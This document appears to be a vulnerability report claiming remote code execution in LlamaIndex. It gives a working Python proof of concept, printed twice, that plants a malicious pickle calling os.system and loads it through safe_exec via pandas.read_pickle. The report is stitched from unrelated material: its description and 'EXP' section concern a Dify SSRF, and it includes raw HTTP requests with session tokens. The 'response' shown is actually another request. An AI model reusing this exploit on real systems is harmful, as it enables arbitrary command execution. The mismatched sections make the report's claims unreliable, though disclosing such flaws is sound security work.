# Title：LlamaIndex is vulnerable to a **command execution vulnerability** caused by the combination of safe_exec and malicious pickle serialization. 

## 1.summary

- Title：LlamaIndex is vulnerable to a **command execution vulnerability** caused by the combination of safe_exec and malicious pickle serialization.

- Vendor：https://github.com/run-llama/llama_index

- Product:LlamaIndex

- Affected Versions:all

- Vulnerability Type: RCE

## 2.Vulnerability Details

### 2.1Description

The **tool component** in Dify's workflow is vulnerable to **Server-Side Request Forgery (SSRF)**. By constructing malicious URL parameters, attackers can force the server to send requests to internal networks or protected systems, thereby bypassing firewall restrictions to access internal services or perform sensitive operations.

### 2.2Proof of Concept (PoC)

Set up the environment:

```
python -m venv llamaindex_0148_env 
source llamaindex_0148_env/bin/activate 
# Download the file from https://github.com/run-llama/llama_index
pip install ./llama_index-0.14.8.tar.gz 
pip install pandas 
pip install llama-index-experimental
```

A "successfully installed" prompt will appear upon completion of the installation.

![1](1.png)

### Exploitation Logic for Command Execution (Malicious Pickle) via safe_exec + pandas.read_pickle:

Leverage `pandas.read_pickle` to load a malicious pickle file;The pickle file contains `os.system('id > /tmp/...')` to achieve Remote Code Execution (RCE);Only import `llama_index` as follows: `import llama_index`;`pandas` is obtained via LlamaIndex's built-in `PandasCSVReader` module (where `import pandas as pd` is already executed internally);Construct the malicious pickle file locally:The script uses `__import__("pickle")` and `__import__("os")` to create `/tmp/evil.pkl`;The payload passed to `safe_exec` is only: `pd.read_pickle('/tmp/evil.pkl')`;This is a completely "whitelisted action" for `safe_exec`;The actual command execution occurs during the unpickling process.

### Reproduction Process:

+ Step 1: Enter the Python virtual environment

```
source llamaindex_0148_env/bin/activate
```

+ Step 2: Create a Python file

```bash
import llama_index; safe_exec = __import__("llama_index.experimental.exec_utils", fromlist=["safe_exec"]).safe_exec
S = __import__("llama_index.core.readers.file.base", fromlist=["SimpleDirectoryReader"]).SimpleDirectoryReader; pd = S.supported_suffix_fn()[".csv"].__init__.__globals__["pd"]
pickle, os_mod = __import__("pickle"), __import__("os")
class E: __reduce__ = lambda self: (os_mod.system, ("id > /tmp/llamaindex_pickle_rce_cmd.txt",))
pickle.dump(E(), open("/tmp/evil.pkl", "wb"))
PAYLOAD = "pd.read_pickle('/tmp/evil.pkl')"
def main(): safe_exec(PAYLOAD, {"pd": pd}, {}); print(open("/tmp/llamaindex_pickle_rce_cmd.txt").read())
if __name__ == "__main__": main()
```

![2](2.png)

Successfully Executed**

![3](3.png)

### Exploitation Logic for Command Execution (Malicious Pickle) via safe_exec + pandas.read_pickle

Leverage `pandas.read_pickle` to load the malicious pickle file;The pickle file uses `os.system('id > /tmp/...')` to achieve Remote Code Execution (RCE);Only import `llama_index` as follows: `import llama_index`;`pandas` is obtained via LlamaIndex's built-in `PandasCSVReader` module (where `import pandas as pd` has long been executed internally);Local construction of the malicious pickle file:The script uses `__import__("pickle")` and `__import__("os")` to create `/tmp/evil.pkl`;The only payload passed to `safe_exec` is: `pd.read_pickle('/tmp/evil.pkl')`;This is completely a "whitelisted action" for `safe_exec`;The actual command execution occurs during unpickling.

```bash
import llama_index; safe_exec = __import__("llama_index.experimental.exec_utils", fromlist=["safe_exec"]).safe_exec
S = __import__("llama_index.core.readers.file.base", fromlist=["SimpleDirectoryReader"]).SimpleDirectoryReader; pd = S.supported_suffix_fn()[".csv"].__init__.__globals__["pd"]
pickle, os_mod = __import__("pickle"), __import__("os")
class E: __reduce__ = lambda self: (os_mod.system, ("id > /tmp/llamaindex_pickle_rce_cmd.txt",))
pickle.dump(E(), open("/tmp/evil.pkl", "wb"))
PAYLOAD = "pd.read_pickle('/tmp/evil.pkl')"
def main(): safe_exec(PAYLOAD, {"pd": pd}, {}); print(open("/tmp/llamaindex_pickle_rce_cmd.txt").read())
if __name__ == "__main__": main()
```









### 2.3EXP

```
POST /console/api/apps/3f8a803a-d843-42ff-a19a-cb6298c41261/workflows/draft/nodes/1763380884017/run HTTP/1.1
Host: 192.168.3.8:8080
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
content-type: application/json
x-csrf-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjMzODQxNzMsInN1YiI6Ijk1MDg2MmE2LTg4MDMtNDlkMi1hN2Y5LTM3MWQwMTk0OWE2OCJ9.I7P-dEc-g7fXdqb1uDEOSyQ789fMi3Fa7hOaeLwHmAc
Accept: */*
Origin: http://192.168.3.8:8080
Referer: http://192.168.3.8:8080/app/3f8a803a-d843-42ff-a19a-cb6298c41261/workflow
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Cookie: locale=zh-Hans; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOTUwODYyYTYtODgwMy00OWQyLWE3ZjktMzcxZDAxOTQ5YTY4IiwiZXhwIjoxNzYzMzg0MTczLCJpc3MiOiJTRUxGX0hPU1RFRCIsInN1YiI6IkNvbnNvbGUgQVBJIFBhc3Nwb3J0In0.ZJGJ5luoEn8tduXmIZ3JyyzgNpHeYbtmrmGI9VjePAw; refresh_token=e206638f67fa85de207dc05f532b0188a3604091aa5766433f23e549430cb3adcfe853e27cb1be8c7d470585f9c67fa6122cd9d4dfb5f5df40fcfff51cdf7a62; csrf_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjMzODQxNzMsInN1YiI6Ijk1MDg2MmE2LTg4MDMtNDlkMi1hN2Y5LTM3MWQwMTk0OWE2OCJ9.I7P-dEc-g7fXdqb1uDEOSyQ789fMi3Fa7hOaeLwHmAc
Connection: keep-alive

{"inputs":{}}


response：

POST /console/api/apps/3f8a803a-d843-42ff-a19a-cb6298c41261/workflows/draft HTTP/1.1
Host: 192.168.3.8:8080
Content-Length: 2313
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
content-type: application/json
x-csrf-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjMzODQxNzMsInN1YiI6Ijk1MDg2MmE2LTg4MDMtNDlkMi1hN2Y5LTM3MWQwMTk0OWE2OCJ9.I7P-dEc-g7fXdqb1uDEOSyQ789fMi3Fa7hOaeLwHmAc
Accept: */*
Origin: http://192.168.3.8:8080
Referer: http://192.168.3.8:8080/app/3f8a803a-d843-42ff-a19a-cb6298c41261/workflow
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Cookie: locale=zh-Hans; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiOTUwODYyYTYtODgwMy00OWQyLWE3ZjktMzcxZDAxOTQ5YTY4IiwiZXhwIjoxNzYzMzg0MTczLCJpc3MiOiJTRUxGX0hPU1RFRCIsInN1YiI6IkNvbnNvbGUgQVBJIFBhc3Nwb3J0In0.ZJGJ5luoEn8tduXmIZ3JyyzgNpHeYbtmrmGI9VjePAw; refresh_token=e206638f67fa85de207dc05f532b0188a3604091aa5766433f23e549430cb3adcfe853e27cb1be8c7d470585f9c67fa6122cd9d4dfb5f5df40fcfff51cdf7a62; csrf_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjMzODQxNzMsInN1YiI6Ijk1MDg2MmE2LTg4MDMtNDlkMi1hN2Y5LTM3MWQwMTk0OWE2OCJ9.I7P-dEc-g7fXdqb1uDEOSyQ789fMi3Fa7hOaeLwHmAc
Connection: keep-alive

{"graph":{"nodes":[{"id":"1763380884017","type":"custom","data":{"variables":[],"method":"get","url":"http://192.168.3.8:9992","authorization":{"type":"no-auth","config":null},"headers":"","params":"","body":{"type":"form-data","data":[{"id":"key-value-8883","type":"text","key":"","value":""}]},"ssl_verify":true,"timeout":{"max_connect_timeout":0,"max_read_timeout":0,"max_write_timeout":0},"retry_config":{"retry_enabled":true,"max_retries":3,"retry_interval":100},"type":"http-request","title":"HTTP 请求","selected":true},"position":{"x":426,"y":249},"targetPosition":"left","sourcePosition":"right","positionAbsolute":{"x":426,"y":249},"width":242,"height":121,"selected":true},{"id":"1763381398280","type":"custom","data":{"mode":"visual","frequency":"daily","visual_config":{"time":"12:00 AM","weekdays":["sun"],"on_minute":0,"monthly_days":[1]},"cron_expression":"","type":"trigger-schedule","title":"定时触发器","selected":true},"position":{"x":156,"y":228},"targetPosition":"left","sourcePosition":"right","positionAbsolute":{"x":156,"y":228},"width":242,"height":130,"selected":false}],"edges":[{"id":"1763381398280-source-1763380884017-target","type":"custom","source":"1763381398280","target":"1763380884017","sourceHandle":"source","targetHandle":"target","data":{"sourceType":"trigger-schedule","targetType":"http-request","isInLoop":false},"zIndex":0}],"viewport":{"x":0,"y":0,"zoom":1}},"features":{"opening_statement":"","suggested_questions":[],"suggested_questions_after_answer":{"enabled":false},"text_to_speech":{"enabled":false,"voice":"","language":""},"speech_to_text":{"enabled":false},"retriever_resource":{"enabled":true},"sensitive_word_avoidance":{"enabled":false},"file_upload":{"image":{"enabled":false,"number_limits":3,"transfer_methods":["local_file","remote_url"]},"enabled":false,"allowed_file_types":["image"],"allowed_file_extensions":[".JPG",".JPEG",".PNG",".GIF",".WEBP",".SVG"],"allowed_file_upload_methods":["local_file","remote_url"],"number_limits":3,"fileUploadConfig":{"file_size_limit":15,"batch_count_limit":5,"image_file_size_limit":10,"video_file_size_limit":100,"audio_file_size_limit":50,"workflow_file_upload_limit":10}}},"environment_variables":[],"conversation_variables":[],"hash":"02b27ccba55aa9160cca865791f601a5a60555e7ad36c02a0cd8aabc75d90dc6"}
```



